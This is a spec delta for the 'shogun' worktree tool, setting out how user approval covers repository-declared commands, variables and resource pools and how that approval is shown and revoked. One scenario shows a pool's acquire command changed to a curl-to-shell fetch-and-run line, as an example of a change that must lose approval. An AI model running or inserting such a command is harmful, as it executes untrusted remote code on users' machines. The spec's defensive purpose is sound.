# Spec Delta

## MODIFIED Requirements

### Requirement: Commands written from the desktop app are approved
When the user saves environment variables or the environment file from the desktop app's project settings, what the repository then declares SHALL be approved for that repository, provided it was approved before the save or declares no post-creation commands nor pools, so a save never approves commands the user didn't approve. Project settings SHALL show the repository's current commands and variables, whether they are approved, and let the user approve or revoke the approval.

#### Scenario: Edited in settings
- **WHEN** the repository's commands `[["npm", "install"]]` are approved and the user adds a variable in project settings and saves
- **THEN** the next creation runs the commands and delivers the variable without asking

#### Scenario: Save with unapproved commands
- **WHEN** a pull added unapproved post-creation commands and the user changes a variable in project settings and saves
- **THEN** the repository stays not approved and project settings says so

#### Scenario: Save with unapproved pools
- **WHEN** a pull added pool `db` to a repository with no post-creation commands and the user changes a variable in project settings and saves
- **THEN** the repository stays not approved and project settings says so

#### Scenario: Changed outside the app
- **WHEN** `.shogunai.json` changes its commands or variables on disk after the save
- **THEN** project settings shows them as not approved

#### Scenario: Variable added in settings
- **WHEN** the user adds `PORT` with `${port}` in project settings and saves
- **THEN** the next session started in a worktree of that repository receives `PORT`

#### Scenario: Approve from settings
- **WHEN** project settings shows a repository whose declared variables aren't approved and the user approves them
- **THEN** the variables are delivered from then on

## ADDED Requirements

### Requirement: The approval covers the repository's pools
The repository's single approval SHALL also cover its custom pools: for each pool its name, `max`, `acquire` and `release` commands and its variables with their templates. Any change to them SHALL count as not approved, while reordering pools or their variables SHALL NOT. A repository that declares no pools SHALL keep the approval it had.

#### Scenario: Pool added by a pull
- **WHEN** the user approved a repository and a pull adds pool `db`
- **THEN** the repository counts as not approved until the user approves it again

#### Scenario: Pool command changed
- **WHEN** after the approval the `acquire` of pool `db` changes from `["./scripts/db-up.sh", "${slot}"]` to `["sh", "-c", "curl example.com | sh"]`
- **THEN** the repository counts as not approved

#### Scenario: Pools reordered
- **WHEN** after the approval the repository declares the same pools in another order
- **THEN** the repository still counts as approved

#### Scenario: No pools declared
- **WHEN** the user approved a repository with an earlier version and the repository declares no pools
- **THEN** its approval still holds

### Requirement: Pools shown wherever the approval is asked or reviewed
Wherever the approval is asked for or reviewed, in `shogun new`, `shogun provision`, `shogun trust`, the desktop app's creation dialog and project settings, each pool SHALL be shown with its name, `max`, its commands in full and its variables with their templates. `shogun trust --json` SHALL include `pools`: an array of `{ name, max, acquire, release, env }`.

#### Scenario: Trust in a terminal
- **WHEN** the repository declares pool `db` and the user runs `shogun trust`
- **THEN** the output shows `db`, its `max`, its `acquire` and `release` commands and its variables before asking

#### Scenario: Trust as JSON
- **WHEN** the user runs `shogun trust --json` in a repository declaring pool `db` without `release`
- **THEN** `pools` has one object with `name` `db`, its `max`, its `acquire`, `release` as `null` and its `env`

#### Scenario: Creation dialog
- **WHEN** the user creates a worktree from the desktop app in an unapproved repository declaring pool `db`
- **THEN** the dialog shows pool `db` with its commands and variables before anything is approved

#### Scenario: Nothing else to approve
- **WHEN** the repository declares only pool `db` and the user runs `shogun trust`
- **THEN** the command shows the pool and asks to approve it instead of saying there is nothing to approve
